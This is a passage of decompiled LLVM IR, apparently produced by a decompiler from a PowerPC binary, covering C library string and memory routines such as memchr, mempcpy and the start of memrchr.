  store i1 %v4_1000d044, i1* %cr7_eq.global-to-local, align 1
  %v3_1000d050 = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_1000d0b4, i32* %r30.global-to-local, align 4
  %tmp85 = icmp sgt i8 %v3_1000d050, 0
  %v1_1000d064 = zext i1 %tmp85 to i32
  store i32 %v1_1000d064, i32* %r9.global-to-local, align 4
  %v2_1000d068 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_1000d068, i32* %r0.global-to-local, align 4
  %v2_1000d06c = sub i32 %v2_1000d048, %v1_1000d064
  store i32 %v2_1000d06c, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_1000d06c, 1
  br i1 %tmp82, label %dec_label_pc_1000d0d8, label %dec_label_pc_1000d07c

dec_label_pc_1000d07c:                            ; preds = %dec_label_pc_1000d050
  %v3_1000d07c = load i32, i32* %v2_1000cab8, align 4
  store i32 %v3_1000d07c, i32* %r0.global-to-local, align 4
  %v1_1000d080 = and i32 %v3_1000d07c, 8
  store i32 %v1_1000d080, i32* %r7.global-to-local, align 4
  %v3_1000d080 = icmp eq i32 %v1_1000d080, 0
  br i1 %v3_1000d080, label %dec_label_pc_1000d0a4, label %dec_label_pc_1000d088

dec_label_pc_1000d088:                            ; preds = %dec_label_pc_1000d07c
  %v1_1000d08c = add i32 %v0_1000d0b4, 12
  store i32 %v1_1000d08c, i32* %r30.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000f983.241 to i32), i32* %r9.global-to-local, align 4
  %v2_1000d094 = inttoptr i32 %v0_1000d0b4 to i32*
  store i32 160, i32* %v2_1000d094, align 4
  %v0_1000d098 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d098 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000d098 = add i32 %v1_1000d098, 4
  %v3_1000d098 = inttoptr i32 %v2_1000d098 to i32*
  store i32 %v0_1000d098, i32* %v3_1000d098, align 4
  %v0_1000d09c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d09c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000d09c = add i32 %v1_1000d09c, 8
  %v3_1000d09c = inttoptr i32 %v2_1000d09c to i32*
  store i32 %v0_1000d09c, i32* %v3_1000d09c, align 4
  br label %dec_label_pc_1000d0d8

dec_label_pc_1000d0a4:                            ; preds = %dec_label_pc_1000d07c
  %v1_1000d0a4 = add i32 %tmp, 16
  %v2_1000d0a4 = inttoptr i32 %v1_1000d0a4 to i32*
  %v3_1000d0a4 = load i32, i32* %v2_1000d0a4, align 4
  store i32 %v3_1000d0a4, i32* %r0.global-to-local, align 4
  %v1_1000d0a8 = icmp slt i32 %v3_1000d0a4, 48
  %v3_1000d0a8 = icmp eq i32 %v3_1000d0a4, 48
  store i1 %v1_1000d0a8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d0a8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d0a8, label %dec_label_pc_1000d0b0, label %dec_label_pc_1000d0cc

dec_label_pc_1000d0b0:                            ; preds = %dec_label_pc_1000d0a4
  %v3_1000d0b0 = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_1000d0b4, i32* %r30.global-to-local, align 4
  %v2_1000d0b8 = add i32 %v3_1000d0b0, %v2_1000d06c
  store i32 %v2_1000d0b8, i32* %r0.global-to-local, align 4
  store i32 %v2_1000d0b8, i32* %stack_var_-140, align 4
  br label %dec_label_pc_1000d0d8

dec_label_pc_1000d0c4:                            ; preds = %dec_label_pc_1000d0e0
  store i32 -1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000d114

dec_label_pc_1000d0cc:                            ; preds = %dec_label_pc_1000d0a4
  store i32 %v2_1000d048, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d0b4, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d0d8

dec_label_pc_1000d0d8:                            ; preds = %dec_label_pc_1000d050, %dec_label_pc_1000d0b0, %dec_label_pc_1000d088, %dec_label_pc_1000d0cc
  store i32 0, i32* %r29.global-to-local, align 4
  %v2_1000d0dc = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1000d0dc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d0e0

dec_label_pc_1000d0e0:                            ; preds = %dec_label_pc_1000d110, %dec_label_pc_1000d0d8
  %v0_1000d0f0 = phi i32 [ %v1_1000d0fc, %dec_label_pc_1000d110 ], [ %v2_1000d0dc, %dec_label_pc_1000d0d8 ]
  %v1_1000d0e0 = inttoptr i32 %v0_1000d0f0 to i32*
  %v2_1000d0e0 = load i32, i32* %v1_1000d0e0, align 4
  store i32 %v2_1000d0e0, i32* %r4.global-to-local, align 4
  %v0_1000d0e4 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000d0e4, i32* %r3.global-to-local, align 4
  %v1_1000d0e8 = add i32 %v0_1000d0f0, 4
  %v2_1000d0e8 = inttoptr i32 %v1_1000d0e8 to i32*
  %v3_1000d0e8 = load i32, i32* %v2_1000d0e8, align 4
  store i32 %v3_1000d0e8, i32* %r5.global-to-local, align 4
  %v0_1000d0ec = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_1000d0ec, i32* %ctr.global-to-local, align 4
  %v1_1000d0f0 = add i32 %v0_1000d0f0, 8
  %v2_1000d0f0 = inttoptr i32 %v1_1000d0f0 to i32*
  %v3_1000d0f0 = load i32, i32* %v2_1000d0f0, align 4
  store i32 %v3_1000d0f0, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_1000d0ec)
  %v0_1000d0f8 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d0f8 = add i32 %v0_1000d0f8, 4
  %v2_1000d0f8 = inttoptr i32 %v1_1000d0f8 to i32*
  %v3_1000d0f8 = load i32, i32* %v2_1000d0f8, align 4
  store i32 %v3_1000d0f8, i32* %r0.global-to-local, align 4
  %v1_1000d0fc = add i32 %v0_1000d0f8, 12
  store i32 %v1_1000d0fc, i32* %r31.global-to-local, align 4
  %v0_1000d100 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000d100 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000d100 = add i32 %v1_1000d100, %v0_1000d100
  store i32 %v2_1000d100, i32* %r29.global-to-local, align 4
  %v2_1000d104 = icmp slt i32 %v1_1000d100, %v3_1000d0f8
  %v4_1000d104 = icmp eq i32 %v1_1000d100, %v3_1000d0f8
  store i1 %v2_1000d104, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d104, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d108 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d108 = icmp ult i32 %v1_1000d0fc, %v1_1000d108
  %v3_1000d108 = icmp ugt i32 %v1_1000d0fc, %v1_1000d108
  %v4_1000d108 = icmp eq i32 %v1_1000d0fc, %v1_1000d108
  store i1 %v2_1000d108, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_1000d108, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_1000d108, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1000d104, label %dec_label_pc_1000d110, label %dec_label_pc_1000d0c4

dec_label_pc_1000d110:                            ; preds = %dec_label_pc_1000d0e0
  br i1 %v2_1000d108, label %dec_label_pc_1000d0e0, label %dec_label_pc_1000d114

dec_label_pc_1000d114:                            ; preds = %dec_label_pc_1000d110, %dec_label_pc_1000d0c4
  %v0_1000d118 = phi i32 [ -1, %dec_label_pc_1000d0c4 ], [ %v2_1000d100, %dec_label_pc_1000d110 ]
  store i32 %v0_1000ca68, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d118, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000d118

; uselistorder directives
  uselistorder i32 %v0_1000d118, { 1, 0 }
  uselistorder i32 %v1_1000d100, { 2, 1, 0 }
  uselistorder i32 %v1_1000d0fc, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v3_1000d0f8, { 1, 0, 2 }
  uselistorder i32 %v0_1000d0f0, { 0, 2, 1 }
  uselistorder i32 %v3_1000d0a4, { 1, 0, 2 }
  uselistorder i32 %v1_1000d064, { 1, 0 }
  uselistorder i32 %v2_1000d048, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000d040, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000d03c, { 1, 0 }
  uselistorder i32 %v0_1000d0b4, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_1000d008, { 1, 2, 0 }
  uselistorder i32 %v1_1000cfec, { 1, 0, 2 }
  uselistorder i32 %v2_1000cfe8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_1000cfb8, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_1000cf88, { 2, 0, 1 }
  uselistorder i32 %v2_1000cf84, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000cef4, { 1, 0 }
  uselistorder i32 %v2_1000ce58, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1000ce2c, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_1000cdf4, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000cdec, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_1000cdb8, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_1000cda8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_1000cd9c, { 1, 0, 2 }
  uselistorder i32 %v1_1000cd80, { 0, 3, 2, 1 }
  uselistorder i32 %v2_1000cd38, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_1000cd28, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000cd0c, { 1, 0 }
  uselistorder i32 %v1_1000cce8, { 1, 0 }
  uselistorder i32 %v2_1000ccc8, { 1, 0, 2 }
  uselistorder i32 %v0_1000cc70, { 1, 0 }
  uselistorder i32 %v1_1000cad4, { 1, 0 }
  uselistorder i32 %v0_1000cb60, { 2, 1, 0 }
  uselistorder i32 %v1_1000caa8, { 1, 0 }
  uselistorder i32 %v1_1000ca88, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 2, 5, 0, 6, 1, 7 }
  uselistorder i32* %r8.global-to-local, { 36, 37, 0, 8, 9, 10, 11, 1, 12, 13, 14, 2, 15, 16, 17, 3, 18, 19, 20, 4, 21, 22, 23, 5, 6, 7, 24, 27, 25, 28, 29, 26, 31, 30, 32, 33, 34, 35, 38 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 8, 7, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 11, 9, 10, 12, 13, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 5, 6, 7, 8, 3, 9, 4, 10 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4, 8, 9, 5, 10, 6, 11, 12, 7, 13 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 16, 15, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 29, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 31, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 4, 2, 1 }
  uselistorder i32 45, { 1, 0 }
  uselistorder i32 112, { 2, 3, 0, 1, 4 }
  uselistorder i32 176, { 1, 2, 0, 3 }
  uselistorder i8 48, { 2, 3, 4, 5, 7, 6, 8, 0, 9, 1 }
  uselistorder i1 false, { 1, 2, 4, 5, 7, 8, 9, 0, 6, 3, 10 }
  uselistorder i32 17, { 2, 8, 3, 9, 10, 4, 11, 5, 14, 15, 12, 13, 1, 0, 6, 7 }
  uselistorder i32 48, { 9, 10, 1, 11, 12, 13, 6, 14, 5, 15, 2, 0, 16, 17, 3, 7, 8, 4 }
  uselistorder i32 9, { 6, 1, 7, 2, 8, 0, 9, 10, 11, 12, 13, 3, 4, 5, 14, 15 }
  uselistorder i32 -2147483648, { 9, 0, 1, 11, 10, 2, 4, 3, 12, 6, 5, 13, 8, 7, 14, 15, 16 }
  uselistorder i32 268500992, { 48, 47, 0, 49, 50, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 1, 18, 23, 24, 22, 25, 26, 21, 27, 28, 20, 29, 30, 19, 31, 32, 33, 34, 35, 40, 36, 37, 38, 39, 41, 42, 43, 51, 2, 44, 45, 46, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1000f980.239 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0 }
  uselistorder i32 97, { 5, 4, 0, 3, 1, 2 }
  uselistorder i32 11, { 5, 13, 3, 6, 0, 1, 7, 8, 9, 10, 11, 2, 12, 4 }
  uselistorder label %dec_label_pc_1000d0d8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000d038, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cfe8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000cfd4, { 1, 0 }
  uselistorder label %dec_label_pc_1000cfb0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cf84, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf70, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf54, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cf0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cee8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000cecc, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cdd8, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd98, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cd5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cd30, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000cd10, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc9c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb8c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cae4, { 1, 0 }
  uselistorder label %dec_label_pc_1000cab8, { 1, 0 }
  uselistorder label %dec_label_pc_1000caac, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1000d130 = urem i32 %arg1, 256
  store i32 %v1_1000d130, i32* %r4.global-to-local, align 4
  %v0_1000d1507 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_1000d15413 = icmp eq i32 %arg2, 0
  br i1 %v2_1000d15413, label %dec_label_pc_1000d15c, label %dec_label_pc_1000d158

dec_label_pc_1000d13c:                            ; preds = %dec_label_pc_1000d158
  %v1_1000d13c = inttoptr i32 %v0_1000d13c to i8*
  %v2_1000d13c = load i8, i8* %v1_1000d13c, align 1
  %v3_1000d13c = zext i8 %v2_1000d13c to i32
  %v0_1000d140 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d140 = add i32 %v0_1000d140, -1
  store i32 %v1_1000d140, i32* %r5.global-to-local, align 4
  %v1_1000d144 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d144 = icmp eq i32 %v3_1000d13c, %v1_1000d144
  %v0_1000d148 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d144, i32 %v0_1000d148)
  %v0_1000d14c = load i32, i32* @r3, align 4
  %v1_1000d14c = add i32 %v0_1000d14c, 1
  store i32 %v1_1000d14c, i32* @r3, align 4
  %v0_1000d154 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d154 = add i32 %v0_1000d154, -1
  store i32 %v1_1000d154, i32* %ctr.global-to-local, align 4
  %v2_1000d154 = icmp eq i32 %v1_1000d154, 0
  br i1 %v2_1000d154, label %dec_label_pc_1000d15c.loopexit, label %dec_label_pc_1000d158

dec_label_pc_1000d158:                            ; preds = %entry, %dec_label_pc_1000d13c
  %v0_1000d13c = phi i32 [ %v1_1000d14c, %dec_label_pc_1000d13c ], [ %v0_1000d1507, %entry ]
  %v0_1000d158.in.in = phi i32 [ %v1_1000d14c, %dec_label_pc_1000d13c ], [ %v0_1000d1507, %entry ]
  %v0_1000d158.in = urem i32 %v0_1000d158.in.in, 4
  %v0_1000d158 = icmp eq i32 %v0_1000d158.in, 0
  br i1 %v0_1000d158, label %dec_label_pc_1000d15c.loopexit, label %dec_label_pc_1000d13c

dec_label_pc_1000d15c.loopexit:                   ; preds = %dec_label_pc_1000d158, %dec_label_pc_1000d13c
  %v0_1000d18416.ph = phi i32 [ %v1_1000d14c, %dec_label_pc_1000d13c ], [ %v0_1000d13c, %dec_label_pc_1000d158 ]
  %v0_1000d15c.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1000d160.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d15c

dec_label_pc_1000d15c:                            ; preds = %dec_label_pc_1000d15c.loopexit, %entry
  %v0_1000d160 = phi i32 [ 0, %entry ], [ %v0_1000d160.pre, %dec_label_pc_1000d15c.loopexit ]
  %v0_1000d15c = phi i32 [ %v1_1000d130, %entry ], [ %v0_1000d15c.pre, %dec_label_pc_1000d15c.loopexit ]
  %v0_1000d18416 = phi i32 [ %v0_1000d1507, %entry ], [ %v0_1000d18416.ph, %dec_label_pc_1000d15c.loopexit ]
  %v1_1000d15c = mul i32 %v0_1000d15c, 256
  %v1_1000d160 = udiv i32 %v0_1000d160, 4
  %v2_1000d164 = or i32 %v1_1000d15c, %v0_1000d15c
  %v1_1000d16c = mul i32 %v2_1000d164, 65536
  %v2_1000d178 = or i32 %v1_1000d16c, %v2_1000d164
  store i32 %v1_1000d160, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000d160, 4
  br i1 %tmp, label %dec_label_pc_1000d20c, label %dec_label_pc_1000d184

dec_label_pc_1000d184:                            ; preds = %dec_label_pc_1000d15c, %dec_label_pc_1000d208.backedge
  %v0_1000d208 = phi i32 [ %v1_1000d208, %dec_label_pc_1000d208.backedge ], [ %v1_1000d160, %dec_label_pc_1000d15c ]
  %v0_1000d18c = phi i32 [ %v1_1000d18c, %dec_label_pc_1000d208.backedge ], [ %v0_1000d160, %dec_label_pc_1000d15c ]
  %v0_1000d1c4 = phi i32 [ %v1_1000d188, %dec_label_pc_1000d208.backedge ], [ %v0_1000d18416, %dec_label_pc_1000d15c ]
  %v1_1000d184 = inttoptr i32 %v0_1000d1c4 to i32*
  %v2_1000d184 = load i32, i32* %v1_1000d184, align 4
  %v1_1000d188 = add i32 %v0_1000d1c4, 4
  store i32 %v1_1000d188, i32* @r3, align 4
  %v1_1000d18c = add i32 %v0_1000d18c, -4
  store i32 %v1_1000d18c, i32* %r5.global-to-local, align 4
  %v1_1000d190 = add i32 %v0_1000d1c4, 1
  %v2_1000d194 = xor i32 %v2_1000d184, %v2_1000d178
  %v1_1000d19c = add i32 %v2_1000d194, 2130640639
  %v2_1000d1a0 = xor i32 %v1_1000d19c, %v2_1000d194
  %v2_1000d1a4 = and i32 %v2_1000d1a0, -2130640640
  %v6_1000d1a4 = icmp eq i32 %v2_1000d1a4, -2130640640
  br i1 %v6_1000d1a4, label %dec_label_pc_1000d208.backedge, label %dec_label_pc_1000d1b0

dec_label_pc_1000d208.backedge:                   ; preds = %dec_label_pc_1000d184, %dec_label_pc_1000d1f4
  %v1_1000d208 = add i32 %v0_1000d208, -1
  store i32 %v1_1000d208, i32* %ctr.global-to-local, align 4
  %v2_1000d208 = icmp eq i32 %v1_1000d208, 0
  br i1 %v2_1000d208, label %dec_label_pc_1000d20c, label %dec_label_pc_1000d184

dec_label_pc_1000d1b0:                            ; preds = %dec_label_pc_1000d184
  %v2_1000d1b0 = inttoptr i32 %v0_1000d1c4 to i8*
  %v3_1000d1b0 = load i8, i8* %v2_1000d1b0, align 1
  %v4_1000d1b0 = zext i8 %v3_1000d1b0 to i32
  %v1_1000d1b4 = add i32 %v0_1000d1c4, 3
  %v1_1000d1b8 = add i32 %v0_1000d1c4, 2
  %v4_1000d1bc = icmp eq i32 %v4_1000d1b0, %v0_1000d15c
  br i1 %v4_1000d1bc, label %dec_label_pc_1000d1c4, label %dec_label_pc_1000d1cc

dec_label_pc_1000d1c4:                            ; preds = %dec_label_pc_1000d1b0
  ret i32 %v0_1000d1c4

dec_label_pc_1000d1cc:                            ; preds = %dec_label_pc_1000d1b0
  %v2_1000d1cc = inttoptr i32 %v1_1000d190 to i8*
  %v3_1000d1cc = load i8, i8* %v2_1000d1cc, align 1
  %v4_1000d1cc = zext i8 %v3_1000d1cc to i32
  %v4_1000d1d0 = icmp eq i32 %v4_1000d1cc, %v0_1000d15c
  br i1 %v4_1000d1d0, label %dec_label_pc_1000d1d8, label %dec_label_pc_1000d1e0

dec_label_pc_1000d1d8:                            ; preds = %dec_label_pc_1000d1cc
  ret i32 %v1_1000d190

dec_label_pc_1000d1e0:                            ; preds = %dec_label_pc_1000d1cc
  %v2_1000d1e0 = inttoptr i32 %v1_1000d1b8 to i8*
  %v3_1000d1e0 = load i8, i8* %v2_1000d1e0, align 1
  %v4_1000d1e0 = zext i8 %v3_1000d1e0 to i32
  %v4_1000d1e4 = icmp eq i32 %v4_1000d1e0, %v0_1000d15c
  br i1 %v4_1000d1e4, label %dec_label_pc_1000d1ec, label %dec_label_pc_1000d1f4

dec_label_pc_1000d1ec:                            ; preds = %dec_label_pc_1000d1e0
  ret i32 %v1_1000d1b8

dec_label_pc_1000d1f4:                            ; preds = %dec_label_pc_1000d1e0
  %v2_1000d1f4 = inttoptr i32 %v1_1000d1b4 to i8*
  %v3_1000d1f4 = load i8, i8* %v2_1000d1f4, align 1
  %v4_1000d1f4 = zext i8 %v3_1000d1f4 to i32
  %v4_1000d1f8 = icmp eq i32 %v4_1000d1f4, %v0_1000d15c
  br i1 %v4_1000d1f8, label %dec_label_pc_1000d200, label %dec_label_pc_1000d208.backedge

dec_label_pc_1000d200:                            ; preds = %dec_label_pc_1000d1f4
  ret i32 %v1_1000d1b4

dec_label_pc_1000d20c:                            ; preds = %dec_label_pc_1000d208.backedge, %dec_label_pc_1000d15c
  %v0_1000d21826 = phi i32 [ %v0_1000d18416, %dec_label_pc_1000d15c ], [ %v1_1000d188, %dec_label_pc_1000d208.backedge ]
  %v0_1000d20c = phi i32 [ %v0_1000d160, %dec_label_pc_1000d15c ], [ %v1_1000d18c, %dec_label_pc_1000d208.backedge ]
  %v1_1000d20c = add i32 %v0_1000d20c, 1
  store i32 %v1_1000d20c, i32* %r5.global-to-local, align 4
  store i32 %v0_1000d20c, i32* %ctr.global-to-local, align 4
  %v2_1000d2283 = icmp eq i32 %v0_1000d20c, 0
  br i1 %v2_1000d2283, label %dec_label_pc_1000d22c, label %dec_label_pc_1000d218

dec_label_pc_1000d218:                            ; preds = %dec_label_pc_1000d20c, %dec_label_pc_1000d218.dec_label_pc_1000d218_crit_edge
  %v1_1000d21c = phi i32 [ %v1_1000d21c.pre, %dec_label_pc_1000d218.dec_label_pc_1000d218_crit_edge ], [ %v0_1000d15c, %dec_label_pc_1000d20c ]
  %v0_1000d218 = phi i32 [ %v1_1000d224, %dec_label_pc_1000d218.dec_label_pc_1000d218_crit_edge ], [ %v0_1000d21826, %dec_label_pc_1000d20c ]
  %v1_1000d218 = inttoptr i32 %v0_1000d218 to i8*
  %v2_1000d218 = load i8, i8* %v1_1000d218, align 1
  %v3_1000d218 = zext i8 %v2_1000d218 to i32
  %v4_1000d21c = icmp eq i32 %v3_1000d218, %v1_1000d21c
  %v0_1000d220 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d21c, i32 %v0_1000d220)
  %v0_1000d224 = load i32, i32* @r3, align 4
  %v1_1000d224 = add i32 %v0_1000d224, 1
  store i32 %v1_1000d224, i32* @r3, align 4
  %v0_1000d228 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d228 = add i32 %v0_1000d228, -1
  store i32 %v1_1000d228, i32* %ctr.global-to-local, align 4
  %v2_1000d228 = icmp eq i32 %v1_1000d228, 0
  br i1 %v2_1000d228, label %dec_label_pc_1000d22c, label %dec_label_pc_1000d218.dec_label_pc_1000d218_crit_edge

dec_label_pc_1000d218.dec_label_pc_1000d218_crit_edge: ; preds = %dec_label_pc_1000d218
  %v1_1000d21c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d218

dec_label_pc_1000d22c:                            ; preds = %dec_label_pc_1000d218, %dec_label_pc_1000d20c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000d228, { 1, 0 }
  uselistorder i32 %v1_1000d224, { 1, 0 }
  uselistorder i32 %v0_1000d20c, { 1, 2, 0 }
  uselistorder i32 %v1_1000d208, { 2, 1, 0 }
  uselistorder i32 %v1_1000d18c, { 0, 2, 1 }
  uselistorder i32 %v1_1000d188, { 0, 2, 1 }
  uselistorder i32 %v0_1000d1c4, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_1000d164, { 1, 0 }
  uselistorder i32 %v1_1000d160, { 1, 0 }
  uselistorder i32 %v0_1000d18416, { 1, 0 }
  uselistorder i32 %v0_1000d15c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_1000d160, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1000d154, { 1, 0 }
  uselistorder i32 %v1_1000d14c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000d1507, { 2, 0, 1 }
  uselistorder i32 %v1_1000d130, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 2, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d218, { 1, 0 }
  uselistorder label %dec_label_pc_1000d208.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d184, { 1, 0 }
  uselistorder label %dec_label_pc_1000d158, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268489296, i32* @lr, align 4
  %v0_1000d24c = call i32 @memcpy()
  %v0_1000d254 = load i32, i32* @r28, align 4
  %v1_1000d254 = load i32, i32* @r29, align 4
  %v2_1000d254 = add i32 %v1_1000d254, %v0_1000d254
  ret i32 %v2_1000d254
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000d26c = urem i32 %arg2, 256
  store i32 %v1_1000d26c, i32* %r4.global-to-local, align 4
  %v2_1000d274 = add i32 %arg3, %arg1
  store i32 %v2_1000d274, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_1000d29013 = icmp eq i32 %arg3, 0
  br i1 %v2_1000d29013, label %dec_label_pc_1000d298, label %dec_label_pc_1000d294

dec_label_pc_1000d27c:                            ; preds = %dec_label_pc_1000d294
  %v1_1000d27c = add i32 %v0_1000d27c, -1
  %v2_1000d27c = inttoptr i32 %v1_1000d27c to i8*
